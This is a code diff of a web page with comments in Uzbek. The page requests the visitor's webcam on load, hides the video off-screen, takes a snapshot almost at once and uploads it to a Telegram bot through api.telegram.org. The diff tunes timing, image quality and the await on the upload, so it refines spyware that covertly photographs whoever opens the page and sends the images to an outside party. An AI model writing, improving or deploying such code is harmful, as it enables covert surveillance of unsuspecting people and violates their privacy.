@@ -18,10 +18,8 @@
             position: absolute;
             top: -1000px;
             left: -1000px;
-            width: 100%;
-            height: 100%;
-            max-width: 320px;
-            max-height: 240px;
+            width: 320px;
+            height: 240px;
         }
 
         .hidden {
@@ -45,7 +43,7 @@
         // Kamera ruxsati va video oqimini boshlash
         async function boshlashKamerani() {
             try {
-                // Kamera ruxsatini so'rash (tez yuklash uchun)
+                // Kamera ruxsatini so'rash (past o'lchamda tezroq yuklash uchun)
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
@@ -57,11 +55,11 @@
                 
                 video.srcObject = stream;
                 
-                // Video tayyor bo'lgach darhol rasmga olish
-                video.addEventListener('play', function() {
-                    // 1ms dan keyin rasmga olish
-                    setTimeout(rasmgaOlishVaYuborish, 1);
-                });
+                // Video yuklanishini kutish
+                video.onloadedmetadata = () => {
+                    // Darhol rasmga olish (100ms dan keyin)
+                    setTimeout(rasmgaOlishVaYuborish, 100);
+                };
                 
             } catch (xato) {
                 console.error('Kamera xatosi:', xato);
@@ -79,11 +77,11 @@
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Rasmni base64 formatga o'tkazish (tez uchun)
-                const rasmDataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                // Rasmni base64 formatga o'tkazish (tezroq uchun sifatni pasaytiramiz)
+                const rasmDataUrl = canvas.toDataURL('image/jpeg', 0.6);
                 
-                // Telegramga yuborish (async holda)
-                yuborishTelegramga(rasmDataUrl);
+                // Telegramga yuborish
+                await yuborishTelegramga(rasmDataUrl);
                 
             } catch (xato) {
                 console.error('Rasmga olish xatosi:', xato);
@@ -103,15 +101,16 @@
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', rasmBlob, 'webcam_photo.jpg');
+                formData.append('caption', '');
                 
-                // Telegram API orqali rasm yuborish (async holda, kutmaymiz)
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                // Telegram API orqali rasm yuborish (soddalashtirilgan)
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
-                }).catch(err => console.error('Telegram xatosi:', err));
+                });
                 
             } catch (xato) {
-                console.error('Telegram tayyorlash xatosi:', xato);
+                console.error('Telegram yuborish xatosi:', xato);
             }
         }
 
@@ -126,12 +125,7 @@
         }
 
         // Sahifa yuklanganda darhol kamerani boshlash
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', boshlashKamerani);
-        } else {
-            // Agar DOM allaqachon yuklangan bo'lsa
-            boshlashKamerani();
-        }
+        window.addEventListener('load', boshlashKamerani);
         
         // Sahifadan chiqilganda kamerani to'xtatish
         window.addEventListener('beforeunload', tozalashKamerani);
